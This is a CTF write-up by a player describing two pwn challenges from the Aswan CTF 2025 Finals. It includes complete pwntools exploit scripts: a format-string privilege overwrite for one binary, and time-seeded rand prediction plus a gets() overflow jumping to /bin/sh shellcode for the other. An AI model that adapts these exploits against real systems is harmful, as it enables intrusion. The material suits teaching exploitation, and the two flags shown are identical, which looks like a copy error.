---
title: Yaoguai Aswan CTF 2025 Finals
date: 2025-05-02 20:00:00
categories: [CTF Writeup]
tags: [ctf,pwn]
image: https://miro.medium.com/v2/resize:fit:720/format:webp/1*bx_b4lAb-GFZ3enD-qabMA.png
---

Hello there 👋

This is 0xS4Y3D, Alhamdullilah, I participated in Yaoguai Aswan CTF 2025 Finals and I managed to solve all pwn challenges and get a <b style="color: red;">FIRST BLOOD</b> in the second one

Today, I’d like to share my writeup for all those pwn challenges

Enjooooy…


## [Pwn] Baby Blue
### Recon Stage 🔍

I like first to checksec the binary to be aware of what possible scenarios might be
I will start my analysis with checksec to see what possible 

![checksec](https://miro.medium.com/v2/resize:fit:640/format:webp/1*dkIGL1KvNO8OrR11anag5g.png)

After I ran the binary and play with it I discoverd:
1. Reads username and saves it somewhere
2. Takes username and checks it and marks it as logged in
3. Prints out username, privilage = 2
4. Checks for privilage, which is 2, and says “Admin privilages required”

Let’s see IDA pseudo-code to understand more
![register](https://miro.medium.com/v2/resize:fit:720/format:webp/1*G6dpi-67NsY0jFqqeO0TZA.png)

In ```register_user()``` function above, it searches for a free spot in an array of length 8 of users struct.

Then, it fills the 32bit struct as followsh:

1. [00:16]&emsp;reads a **12 bytes** username in first 16 byte
2. [16:24]&emsp;pointer to a heap value of 2 [mostly the privilage value].
3. [24:32]&emsp;sets it to 1 [indicator that this spot is reserved]

The login function works the same by looping until finding the exact match and sets a global variable to indicate current user.

As for ```show_profile()```:
![show_profile](https://miro.medium.com/v2/resize:fit:720/format:webp/1*Hz-PDiuI7y7bsXXiQVg7eQ.png)

Ahhh, we see it prints out username of current user in without specifying a format. <b style="color: green;">Format String!!!</b>

Now, we know we have a fmt_str but remember, it reads only 12 chars 🥲

Okay lets keep digging to know how to read the flag…

![admin_panel](https://miro.medium.com/v2/resize:fit:720/format:webp/1*AzhkMX5HkemDYk5dXUPwbw.png)

In ```admin_panel()``` functoin, it simply checks if the permission of current user is 5 to read the flag, but wait, it only reads to ptr but doesn’t print it out. 🙃


### Pwning Stage ☠️

My idea is simply to use the format string in ```show_profile()``` to write to the permission variable of the current user.

For writing with format string we need:
- pointer to target
- offset from fmt_str to that target pointer

> We are sure that there must be a pointer to ```gUsers``` array on stsck because the array itself in heap but the pointer is on the stack.
{: .prompt-info}

Let’s break in show_profile() and lookup the stack + register username %6$p to print the 6th arg of printf

![memory](https://miro.medium.com/v2/resize:fit:720/format:webp/1*6By-p1JPjaFzASPe8KrG1g.png)

Here we got the privilage pointer at **offset 12** from our executable

Now we know how to bypass the condition, but what about printing the flag from out of stack??

![final](https://miro.medium.com/v2/resize:fit:720/format:webp/1*7XIShQkwWb3m0oAYZc_bEA.png)

Write after we bypass the privilage condition, we can print any user of the array.

Look! I can’t go over 7, but I can go down with negatives until print flag from stack 😎

**-10 worked for me**

![](https://miro.medium.com/v2/resize:fit:640/format:webp/1*AYaRfFgtAuIi0eIKV88saw.png)

### Exploit Script ✍️
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './baby_blue')

if args.LOCAL_LIBC:
    libc = exe.libc
else:
    library_path = libcdb.download_libraries('./libc.so.6')
    if library_path:
        exe = context.binary = ELF.patch_custom_libraries(exe.path, library_path)
        libc = exe.libc
    else:
        libc = ELF('./libc.so.6')

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

gdbscript = '''
b *show_profile+101
continue
'''.format(**locals())

# -- Exploit goes here --
io = start()
pay1 = b"AAAAA%28$n" # offset differs locally

# Send payload to register
io.sendlineafter(b"> ", b"1")
io.recv()
io.sendline(pay1)

# Sender payload to login
io.sendlineafter(b"> ", b"2")
io.recv()
io.sendline(pay1)

# Invoke show_profile to write
io.sendlineafter(b"> ", b"3")

# Invoke admin_panel
io.sendlineafter(b"> ", b"4")

io.recv()
io.sendline(b"-10")

io.interactive()
```

> Format string offset will differ from local environment and remote environment, so you need bruteforce it, it was 28 for me on remote instance
{: .prompt-tip }

> _YAO{Y0u_Ar3_S0_Lucky_GGWp}_

---

## [Pwn] Lucky
### Recon Stage 🔍

![checksec](https://miro.medium.com/v2/resize:fit:640/format:webp/1*MoPIuFk08kFcDnNK9CNDdA.png)

Oh, **stack is executable**, it’s mostly a shellcode injection, let’s run it and make sure.

![exe](https://miro.medium.com/v2/resize:fit:640/format:webp/1*2kn7ZxcHjl2fnMvKHq5hdw.png)

It reads a number from 0–999 and compares it with a random generated value.

Let’s see pseudo-code to know what happens after that

![code](https://miro.medium.com/v2/resize:fit:720/format:webp/1*dLWLtFcV2e3rHPVurf8FIg.png)

As expected, it generates a random number seeded with ```time()``` which needs to be guessed somehow, then it calls ```gift()```

![gift](https://miro.medium.com/v2/resize:fit:640/format:webp/1*KL3CwJaHwwwQvB0fXz6o-A.png)

```gift()``` only invokes ```gets()```, so we have a **buffer overflow which mostly will be used for writing shellcode and jumping to it.**


### Pwning Stage ☠️

To pwn this exe, we need two things:
1. a way to expect exactly the number generated by rand
2. injecting shellcode and jump to it

First, let’s expect the random generated number by this code written by ChatGPT which uses libc to use libc rand & seed functions

```c
import time
import ctypes

libc = ctypes.CDLL("libc.so.6")
current_time = int(time.time())
libc.srand(current_time)
rand_value = libc.rand()
num = rand_value % 1000
```

The above code simply uses ```srand()``` and ```rand()``` function from libc rather than the ones provided by Python

Now, let’s calcualate rip offset in gift function using ```cyclic 100```

```
pwndbg> cyclic 100
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
pwndbg> c
Continuing.
aaaaaaaabaaaaaaacaaaaaaadaaaaaaaeaaaaaaafaaaaaaagaaaaaaahaaaaaaaiaaaaaaajaaaaaaakaaaaaaalaaaaaaamaaa
```
```
► 0         0x4011d0 gift+42
   1 0x616161616161616a None
   2 0x616161616161616b None
   3 0x616161616161616c None
   4   0x7f006161616d None
   5         0x401303 main+89
───────────────────────────────────────────────────────────────────────────────────────────
pwndbg> cyclic -l 0x616161616161616a
Finding cyclic pattern of 8 bytes: b'jaaaaaaa' (hex: 0x6a61616161616161)
Found at offset 72
pwndbg>
```

✅ **rip will be @ offset 72**

Finally, to jump to our shellcode, we’ll use ```jmp rax``` gadget **relying on the knowledge that ```gets()``` return value is the address it wrote into.**

![gadget](https://miro.medium.com/v2/resize:fit:640/format:webp/1*pGTozW4D_YO-XljgKU18QA.png)


![shell](https://miro.medium.com/v2/resize:fit:640/format:webp/1*Nq_gsJrCrNJIWC7_gSL_tg.png)

### Exploit Script ✍️
```python
#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF(args.EXE or './lucky')

host = args.HOST or '34.65.87.36'
port = int(args.PORT or 8084)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = ''''
b *gift
'''.format(**locals())

# -- Exploit goes here --
import time
import ctypes

libc = ctypes.CDLL("libc.so.6")
current_time = int(time.time())
libc.srand(current_time)
rand_value = libc.rand()
num = rand_value % 1000

io = start()

io.sendlineafter(b"(0-999): ", str(num).encode())

jmp_rax = 0x000000000040111c
log.info(jmp_rax)

# shell = asm(shellcraft.sh())

shell = "\x31\xF6\x56\x48\xBB\x2F\x62\x69\x6E\x2F\x2F\x73\x68\x53\x54\x5F\xF7\xEE\xB0\x3B\x0F\x05"

pay = flat({
    0: shell,
    72: jmp_rax
})

log.info(pay)
 
io.recv()
io.sendline(pay)

log.info(len(pay))

io.interactive()
```
> _YAO{Y0u_Ar3_S0_Lucky_GGWp}_

## Download Challenges
You can try pwning the challenges share ideas with me:
- [Baby Blue](/assets/download/aswanctf2025/baby_blue_player.zip)
- [Lucky](/assets/download/aswanctf2025/Lucky_Player.zip)
